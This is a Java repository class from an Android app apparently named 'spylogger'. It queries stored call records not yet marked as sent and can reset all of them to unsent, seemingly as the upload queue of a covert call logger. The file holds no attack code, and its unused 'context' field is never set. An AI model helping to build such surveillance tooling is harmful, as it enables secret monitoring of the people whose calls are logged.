package com.gravatasufoca.spylogger.repositorio.impl;


import android.content.Context;

import com.gravatasufoca.spylogger.model.Ligacao;
import com.gravatasufoca.spylogger.repositorio.RepositorioGenerico;
import com.gravatasufoca.spylogger.repositorio.RepositorioGravacao;

import java.sql.SQLException;
import java.util.Collections;
import java.util.List;


public class RepositorioGravacaoImpl extends RepositorioGenerico<Ligacao> implements RepositorioGravacao {

	private Context context;
	public RepositorioGravacaoImpl(Context context) throws SQLException {
		super(context);
	}

	public Context getContext() {
		return context;
	}


	@Override
	public List<Ligacao> listarNaoEnviados() {
		try {
			List<Ligacao> tmp=database.queryBuilder().orderBy("data", true).where().eq("enviado", false).query();

			return tmp;
		} catch (SQLException e) {
			return Collections.emptyList();
		}
	}

	@Override
	public void reativar() {
		try {
			database.executeRawNoArgs("update ligacao set enviado=0 ");
		} catch (SQLException e) {
			e.printStackTrace();
		}
	}


}
